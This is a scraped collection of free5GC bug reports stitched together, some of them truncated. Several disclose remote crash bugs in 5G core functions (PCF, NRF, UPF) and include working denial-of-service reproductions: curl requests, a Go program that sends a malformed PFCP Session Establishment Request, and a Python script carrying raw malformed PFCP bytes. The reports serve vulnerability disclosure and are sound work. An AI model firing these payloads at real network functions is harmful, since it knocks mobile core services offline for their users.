4. Optional control experiment: repeat the same request with `suppFeat="0"`:
```bash
curl -i -X POST 'http://10.100.200.9:8000/npcf-policyauthorization/v1/app-sessions' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <valid_npcf_policyauthorization_jwt>' \
  --data '{"ascReqData":{"suppFeat":"0","notifUri":"http://127.0.0.1:9999/appsess","ueIpv4":"10.60.0.3","dnn":"internet","medComponents":{"1":{"medCompN":1,"afAppId":"app1"}}}}'
```

Observed output:
```text
HTTP/1.1 201 Created
```

## Expected Behavior
`POST /npcf-policyauthorization/v1/app-sessions` should not panic on valid network input.

It should either:
- create the app session successfully and return `201 Created`, or
- reject the request with a controlled `4xx` response if the combination of `suppFeat` and request fields is invalid,

but it should not crash the handler.

## Screenshots
N/A

## Environment
**Please, complete the following information:**
- free5GC Version: local source tree tag `v4.2.1`
- Runtime validation target: Docker container `pcf`
- Runtime validation SBI endpoint: `10.100.200.9:8000`
- OS: `Ubuntu 22.04 LTS`
- Kernel version: `5.15.0-88-generic`
- go version: `go1.24.9 linux/amd64`

Docker-based free5GC lab, internal SBI network, PCF at `10.100.200.9:8000`, NRF at `10.100.200.3:8000`.

## Walkthrough (Optional)
The panic is caused by a nil dereference in the traffic-routing provisioning path:
- the create logic enables traffic-routing handling when `suppFeat` negotiates feature bit 1
- in the `medComponents` path, `appID` can come from `medComp.AfAppId` while `routeReq` remains `medComp.AfRoutReq`

- the code still calls `provisioningOfTrafficRoutingInfo(smPolicy, appID, routeReq, medComp.FStatus)`

## Additional Context
- This report is intentionally scoped to the panic-based DoS on app-session creation.
- The separate authorization weakness on `npcf-policyauthorization` should be tracked independently; this panic exists even when using an otherwise valid authenticated request.

items.title: [Bugs] NRF Discovery complexQueryFilterSubprocess panics on malformed tai parameter
items.body: ## Bug Description A vulnerability exists in the complexQueryFilterSubprocess function within the NRF Discovery service. When handling the complexQuery parameter, the code attempts to split the tai value by commas and directly access taiSplit[0] and taiSplit[1] without validating that the split operation yields at least two elements. If the tai parameter does not contain a comma or contains fewer than two comma-separated values, accessing taiSplit[1] results in an index out of range panic. This crashes the handler and may terminate the entire service depending on the runtime panic recovery configuration. ## To Reproduce execute: curl -X GET -w "\n%{http_code}\n" "http://10.100.200.18:8000/nnrf-disc/v1/nf-instances?target-nf-type=AMF&requester-nf-type=SMF&complexQuery=$(python3 -c 'import urllib.parse, json; print(urllib.parse.quote(json.dumps({"cnfUnits":[{"cnfUnit":[{"attr":"tai","value":"a"}]}]})))')" ## Expected Behavior The handler should check whether the taiSplit slice contains at least 2 elements before accessing taiSplit[1]. If the parameter is malformed, the API should return a proper validation error (HTTP 400 Bad Request) instead of crashing. ## Screenshots ## Environment free5GC Version: [v4.0.1] OS: [Ubuntu 20.04 Server] Kernel version: [Linux ubuntu-desktop 5.15.0-139-generic] go version: [go version go1.21.8 linux/amd64] C compiler version (optional): [gcc 9.4.0] ## Trace Files ### Configuration Files items.title: [Bugs] UPF crashes on PFCP SessionEstablishmentRequest with malformed OuterHeaderCreation
items.body: ## Bug Decription free5GC UPF can be crashed remotely via its PFCP UDP endpoint by sending a PFCP Session Establishment Request that contains a CreateFAR with Outer Header Creation fields crafted to an invalid/too-short layout. In the UPF PFCP handling path, the request is processed as a new session and then forwarded into the GTP5G forwarder logic (Gtp5g.CreateFAR() → newForwardingParameter()), which parses the OuterHeaderCreation IE using github.com/wmnsk/go-pfcp/ie: ie.(*OuterHeaderCreationFields).UnmarshalBinary(...) attempts to decode fields and calls binary.BigEndian.Uint32(...) This results in panic: runtime error: index out of range [3] with length 3 due to insufficient buffer length for a Uint32 read. The panic is not recovered in the UPF PFCP server main loop (pfcp.go:86), so the entire UPF process crashes, resulting in a remote denial of service. ## To Reproduce Steps to reproduce the behavior: 1. Start a new go project inside a new folder: `go mod init poc` 2. Create a `main.go` and paste the code below: ``` // Vuln-PA1-03: minimal PFCP PoC to trigger UPF panic on OuterHeaderCreation parsing. package main import ( "flag" "fmt" "log" "net" "time" "github.com/wmnsk/go-pfcp/ie" "github.com/wmnsk/go-pfcp/message" ) func main() { targetIP := flag.String("target", "127.0.0.1", "Target UPF IP address") targetPort := flag.Int("port", 8805, "Target UPF PFCP port") localIP := flag.String("local", "10.100.200.6", "NodeID IP address (empty to auto-detect)") flag.Parse() targetAddr := fmt.Sprintf("%s:%d", *targetIP, *targetPort) raddr, err := net.ResolveUDPAddr("udp", targetAddr) if err != nil { log.Fatalf("resolve target address: %v", err) } conn, err := net.DialUDP("udp", nil, raddr) if err != nil { log.Fatalf("create UDP connection: %v", err) } defer conn.Close() nodeID := *localIP if nodeID == "" { nodeID = conn.LocalAddr().(*net.UDPAddr).IP.String() } if err := establishAssociation(conn, nodeID); err != nil { log.Fatalf("association failed: %v", err) } time.Sleep(200 * time.Millisecond) if err := triggerPanic(conn, nodeID); err != nil { log.Printf("send crash request failed: %v", err) } } func establishAssociation(conn *net.UDPConn, nodeID string) error { req := message.NewAssociationSetupRequest( 1, ie.NewNodeIDHeuristic(nodeID), ie.NewRecoveryTimeStamp(time.Now()), ) payload, err := req.Marshal() if err != nil { return fmt.Errorf("marshal AssociationSetupRequest: %w", err) } if _, err := conn.Write(payload); err != nil { return fmt.Errorf("send AssociationSetupRequest: %w", err) } conn.SetReadDeadline(time.Now().Add(5 * time.Second)) buf := make([]byte, 2048) n, err := conn.Read(buf) if err != nil { return fmt.Errorf("AssociationSetupResponse timeout: %w", err) } msg, err := message.Parse(buf[:n]) if err != nil { return fmt.Errorf("parse AssociationSetupResponse: %w", err) } if msg.MessageType() != message.MsgTypeAssociationSetupResponse { return fmt.Errorf("unexpected response type: %d", msg.MessageType()) } return nil } func triggerPanic(conn *net.UDPConn, nodeID string) error { req := message.NewSessionEstablishmentRequest( 0, 0, 0xDEADBEEF001, 2, 0, ie.NewNodeIDHeuristic(nodeID), ie.NewFSEID(0x0001, net.ParseIP(nodeID), nil), ie.NewCreateFAR( ie.NewFARID(1), ie.NewApplyAction(0x02), ie.NewForwardingParameters( ie.NewDestinationInterface(ie.DstInterfaceCore), ie.NewOuterHeaderCreation(0xC0C0, 0, "", "", 0, 0, 0), ), ), ) payload, err := req.Marshal() if err != nil { return fmt.Errorf("marshal SessionEstablishmentRequest: %w", err) } if _, err := conn.Write(payload); err != nil { return fmt.Errorf("send SessionEstablishmentRequest: %w", err) } return nil } ``` 3. Download required libraries: `go mod tidy` 4. Run the program with the UPF address: `go run ./main.go -target 10.100.200.2 -port 8805` ## Expected Behavior UPF should validate the length/format of the OuterHeaderCreation IE before parsing. If the IE is malformed or too short, UPF should reject the PFCP request gracefully (e.g., respond with a PFCP error cause) and continue running. PFCP request handling should not allow a single malformed message to crash the entire UPF process (panic recovery / robust error handling). ## Screenshots ## Environment - free5GC Version: v4.1.0 - OS: Ubuntu 22.04 Server - Kernel version: [e.g. 5.15.0-0-generic] - go version: go version go1.24.9 linux/amd64 ## Trace Files ### Configuration Files Provide the configuration files. If you are unsure of what to do, please zip free5gc's `config` folder and upload it here. ### PCAP File Dump the relevant packets and provide the PCAP file. If you are unsure of what to do, use the following command before reproducing the bug: `sudo tcpdump -i any -w free5gc.pcap`. Then, please upload the `free5gc.pcap` file here. ### Log File ``` 2026-01-14T08:32:26.003375804Z [INFO][UPF][PFCP][LAddr:10.100.200.2:8805] handleAssociationSetupRequest [Bugs] NRF Discovery EncodeGroupId Function Panics on Malformed group-id-list Parameter
items.body: ## Bug Decription A vulnerability exists in the EncodeGroupId function within the NRF Discovery service. When processing the group-id-list parameter (and potentially other group identifier parameters), the code attempts to access array/slice elements without validating the length of the split data. In particular, the function expects a specific format (likely colon-separated) but does not verify that splitting yields enough elements before accessing indexes [0], [1], [2], etc. When the group-id-list parameter contains malformed data with insufficient separator characters, accessing indices beyond the actual slice length results in "index out of range" panic, crashing the handler and potentially terminating the entire service depending on runtime panic recovery configuration. ## To Reproduce Steps to reproduce the behavior: 1. Start free5gC 2. set oauth to false in nrfcfg.yaml for test convenience 3. Run command 'curl -v items.title: [Bugs] UPF crash caused by malformed PFCP messages whose 1st IE length is mutated to zero
items.body:
[Bugs] UPF crash caused by malformed PFCP messages whose 1st IE length is mutated to zero

## Describe the bug
While fuzzing the free5gc UPF for some PFCP basic and security features, I could trigger several crashes when send malformed PFCP Heartbeat Request whose Recovery Time Stamp IE length is mutated to zero. This could cause DOS of any UPF instance, all memory issues due to this kind of PFCP messages are caught by the GO memory runtime, which would casue a panic and crash.

## To Reproduce
Steps to reproduce the behavior:
1. Build the UPF with source code
2. Run the bin/upf with default config/upfcfg.yaml
3. Run the following POC python script


```python
#!/usr/bin/env python3

import socket

udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
udp_socket.settimeout(1.0)

pfcp_association_setup_request = b'\x20\x05\x00\x1f\x00\x00\x01\x00\x00\x3c\x00\x05\x00\x0a\x64\xc8\x64\x00\x60\x00\x04\xe8\x1f\xdc\x30\x00\x2b\x00\x06\x21\x00\x00\x00\x00\x00'

"""
 PFCP Heartbeat Request with a Recovery Time Stamp IE whose length is mutated to zero
"""
pfcp_heartbeat_request = b'\x20\x01\x00\x0c\x00\x00\x02\x00\x00\x60\x00\x00\xe8\x1f\xe7\xb4'

udp_socket.sendto(pfcp_association_setup_request, ('127.0.0.8', 8805))
try:
   udp_socket.recv(65535)
except Exception as exception:
   print(f"Receive failed: {exception}")

udp_socket.sendto(pfcp_heartbeat_request, ('127.0.0.8', 8805))
try:
   udp_socket.recv(65535)
except Exception as exception:
   print(f"Receive failed: {exception}")

udp_socket.close()
```

## Expected behavior
Any people could leverage this to cause DOS and resource consumption against a pool of UPF. As much as possible, check the IE length of PFCP messages, update handling logic or just drop them to avoid frequent crashes. This will greatly improve the availability, stability, and security of free5gc UPF.

items.title: [Bugs] Free5gc NRF is waiting for MongoDB indefinitely
[Feat] PFCP Heartbeat Procedure
items.body:
## Issue Description

Even if a UPF fails and cannnot communicate with SMF, SMF sends a new PFCP session related request to the failed UPF.  And SMF has no way to know when the UPF recovers.

### What's the version are you using
v3.2.1 + latest main

### Is your feature request related to a problem? Please describe.

SMF monitors UPFs by PFCP Heartbeat Procedure (TS 29.244 6.2).  
If SMF detects a UPF failure in the procedure, SMF doesn't send new PFCP session related request to the UPF until it is recovered.

### Describe the solution you'd like

After PFCP association has been established, SMF sends PFCP Heartbeat Request to the UPFs at regular intervals.   
The interval is new item in SMF configuration.
```
  pfcp:
    heartbeat: # the heartbeat related (optional)
      interval: 10s # default is 0s (if interval is 0s, heartbeat procedure is disabled)
```

If SMF receives PFCP Heartbeat Response from a UPF, SMF saves Recovery Time Stamp (T1) in the response when the first response is received. For the second or subsequent response, SMF compares the received Recovery Time Stamp (T2) with T1.  
If T1 < T2, it means the UPF has restarted. SMF deletes PFCP Association and releases all PDU sessions associated with the UPF and trys to re-establish PFCP Association.  
If SMF did not receive PFCP Heartbeat Response from a UPF, SMF takes the same action when T1 < T2.

Pull Requests for the feature.
* [smf](https://github.com/free5gc/smf/pull/63)
* [pfcp](https://github.com/free5gc/pfcp/pull/10)

### Describe alternatives/workarounds you've considered

None

### Additional context

None

## Describe the bug
Multiple data races are occurred in the TestPaging.

## To Reproduce
Apply this patch and exec `./test.sh TestPaging`
```
diff --git a/test.sh b/test.sh
index e5f9168..6ebe7d0 100755
--- a/test.sh
+++ b/test.sh
@@ -193,7 +193,7 @@ then

 else
     cd test
-    $GOROOT/bin/go test -v -vet=off -run $1
+    $GOROOT/bin/go test -race -v -vet=off -run $1
 fi

 terminate $1
```

No data races are shown.

items.title: [Bugs] PDU Session Establishment panic without DNN for subscription
items.body:
## Describe the bug
SMF panics during the construction of PDU Session Establishment Accept message
if DNN of provisioned data in mongodb is different from any of SMF, UPF or UE.

## To Reproduce
1. Set same DNN to smfcfg.conf, upfcfg.yaml and UE.
2. Provision different DNN for the UE to mongodb.
3. Make the UE register to free5GC and try to establish a PDU session.

You can see the following log output which represents SMF paniced.
```
2021-09-06T19:45:15+09:00 [ERRO][SMF][PduSess]  (/home/l5gc/free5gc/NFs/smf/producer/pdu_session.go:180 github.com/free5gc/smf/producer.HandlePDUSessionSMContextCreate)


2021/09/06 19:45:15 [Recovery] 2021/09/06 - 19:45:15 panic recovered:
runtime error: invalid memory address or nil pointer dereference
/usr/local/go/src/runtime/panic.go:212 (0x44d5a9)
        panicmem: panic(memoryError)
/usr/local/go/src/runtime/signal_unix.go:695 (0x44d3f8)
        sigpanic: panicmem()
/home/l5gc/free5gc/NFs/smf/producer/callback.go:71 (0x12b015d)
        ApplySmPolicyFromDecision: for id, sessRuleModel := range decision.SessRules {
/home/l5gc/free5gc/NFs/smf/producer/pdu_session.go:187 (0x12b1fb4)
        HandlePDUSessionSMContextCreate: if err := ApplySmPolicyFromDecision(smContext, smPolicyDecision); err != nil {
```

## Expected behavior
SMF does not panic, and send PDU Session Reject message back. 

## Environment (please complete the following information):
- free5GC Version: 3.0.5
- OS: Ubuntu 18.04
- Kernel version: 5.0.0-23-generic
- go version go1.14.4 linux/amd64

## Pull Request
[Pull Request](https://github.com/free5gc/smf/pull/28) for the fix.

Note:To compile this PR, you need to merge [Pull Request in the nas library](https://github.com/free5gc/nas/pull/8) and [Pull Request in the openapi library](https://github.com/free5gc/openapi/pull/2).
